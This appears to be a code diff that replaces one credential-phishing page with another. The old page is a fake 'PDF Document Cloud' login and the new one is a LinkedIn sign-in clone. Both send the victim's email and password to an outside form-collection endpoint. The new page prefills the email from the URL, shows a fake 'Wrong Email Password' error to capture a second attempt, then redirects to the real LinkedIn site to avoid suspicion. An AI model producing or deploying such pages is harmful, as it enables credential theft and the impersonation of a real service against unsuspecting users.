@@ -1,96 +1,316 @@
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
-    <title>PDF Document Cloud | Sign in</title>
-</head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to LinkedIn</title>
+  <style>
+    body {
+      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #f3f6f8;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
 
-<body style="background-image: url(https://i.postimg.cc/0yV5B2NG/background1.jpg); background-repeat: no-repeat;background-size: cover;">
-    <div class="container-fluid p-0">
-        <div class="container">
-            <div class="row my-5">
-                <div class="col-lg-5 mx-auto">
-                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
-                        <div class="text-left">
-                            <span><img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
-                            <span class="h5">PDF Online</span><br>
-                            <span class="h5"></span><br>
-                            <span class="h">This is a protected document,
-please verify to access.</span><br>
-                            <span id="msg" class="text-danger" style="display: none;">Wrong Password</span><br>
-                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
-                            <small></small>
-                            <div class="form-group">
-                                <form id="pdf-form" action="https://formbold.com/s/9mkW5" method="post">
-                                    <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" autofocus required>
-                            </div>
-                            <div class="form-group mt-2">
-                                <small></small>
-                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" required>
-                            </div>
-                        </div>
-                        <div class="col-lg-12 mt-3">
-                            <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;">DOWNLOAD</button>
-                        </div>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <script>
-        document.getElementById('pdf-form').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Prevent default form submission
+    .login-container {
+      background-color: #ffffff;
+      padding: 24px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
 
-            const submitBtn = document.getElementById('submit-btn');
-            const errorMsg = document.getElementById('error');
-            const passwordMsg = document.getElementById('msg');
-            const form = event.target;
-            const formData = new FormData(form);
+    .login-container h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: #000000;
+      text-align: left;
+    }
 
-            // Disable button and show loading state
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Loading...';
-            errorMsg.style.display = 'none';
-            passwordMsg.style.display = 'none';
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+      position: relative;
+    }
 
-            try {
-                const response = await fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #000000;
+    }
 
-                if (response.ok) {
-                    // Wait for 2 seconds, then show "Wrong Password" message
-                    setTimeout(() => {
-                        passwordMsg.style.display = 'block';
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'DOWNLOAD';
-                    }, 2000);
-                } else {
-                    // Show error message
-                    errorMsg.style.display = 'block';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'DOWNLOAD';
-                }
-            } catch (error) {
-                // Show error message on network failure
-                errorMsg.style.display = 'block';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'DOWNLOAD';
-            }
+    .form-group input {
+      width: 100%;
+      padding: 12px 40px 12px 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #0073b1;
+      box-shadow: 0 0 0 2px rgba(0, 115, 177, 0.2);
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 58%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #0073b1;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 0;
+      height: 20px;
+      line-height: 20px;
+    }
+
+    .password-toggle:hover {
+      text-decoration: underline;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #ffffff;
+      background-color: #0073b1;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #004182;
+    }
+
+    .forgot-password {
+      display: block;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #0073b1;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: #666;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .separator::before {
+      margin-right: 16px;
+    }
+
+    .separator::after {
+      margin-left: 16px;
+    }
+
+    .sign-up {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+    }
+
+    .sign-up a {
+      color: #0073b1;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .sign-up a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 32px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer a {
+      color: #0073b1;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .footer .copyright {
+      margin-bottom: 8px;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    /* LinkedIn Logo */
+    .linkedin-logo {
+      width: 120px;
+      margin-bottom: 24px;
+    }
+  </style>
+  <script>
+    let isFirstSubmission = true; // Track if it's the first submission
+
+    // JavaScript to extract the email from the URL and pre-fill the field
+    window.onload = function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      if (email) {
+        document.getElementById('username').value = email;
+      }
+
+      // Focus on the email field
+      document.getElementById('username').focus();
+    };
+
+    // JavaScript to handle form submission
+    function handleSubmit(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      const form = event.target;
+      const formData = new FormData(form);
+
+      if (isFirstSubmission) {
+        // First submission: Show error message
+        document.getElementById('error-message').innerText = "Wrong Email Password";
+        isFirstSubmission = false; // Mark the first submission as complete
+
+        // Send the form data to grace.php
+        fetch(form.action, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("First submission data sent:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
         });
-    </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'934601997f927bc9',t:'MTc0NTMzNDE4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'938bb3c23cc3c25a',t:'MTc0NjA2NTAwMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93a3a53e3ec76743',t:'MTc0NjMxNjA2Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93bd9a66687a6d9e',t:'MTc0NjU4ODI1My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 
+        // Clear the password field after the first submission
+        document.getElementById('password').value = "";
+      } else {
+        // Second submission: Submit the form and redirect to linkedin.com
+        fetch(form.action, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("Second submission data sent:", data);
+          // Redirect to linkedin.com after form submission
+          window.location.href = "https://www.linkedin.com";
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("An error occurred. Please try again.");
+        });
+      }
+    }
+
+    // JavaScript to toggle password visibility
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      const toggleButton = document.querySelector('.password-toggle');
+
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleButton.textContent = 'Hide';
+      } else {
+        passwordInput.type = 'password';
+        toggleButton.textContent = 'Show';
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <!-- LinkedIn Logo -->
+    <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn Logo" class="linkedin-logo">
+
+    <!-- "Sign in" text moved to the left, above the email field -->
+    <h1>Sign in</h1>
+
+    <form action="https://formbold.com/s/9mkW5" method="post" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label for="username">Email</label>
+        <input type="email" id="username" name="username" readonly>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+        <button type="button" class="password-toggle" onclick="togglePassword()">Show</button>
+      </div>
+
+      <!-- Forgot Password Link -->
+      <a href="#" class="forgot-password">Forgot password?</a>
+
+      <!-- Sign In Button -->
+      <button type="submit" class="login-button">Sign in</button>
+    </form>
+
+    <!-- Separator -->
+    <div class="separator">or</div>
+
+    <!-- Sign Up Link -->
+    <div class="sign-up">
+      New to LinkedIn? <a href="#">Join now</a>
+    </div>
+
+    <!-- Error Message -->
+    <div id="error-message" class="error-message"></div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="copyright">© 2025 LinkedIn</div>
+    <a href="#">User Agreement</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Community Guidelines</a>
+    <a href="#">Cookie Policy</a>
+    <a href="#">Copyright Policy</a>
+    <a href="#">Send Feedback</a>
+    <a href="#">Language</a>
+  </div>
+</body>
 </html>
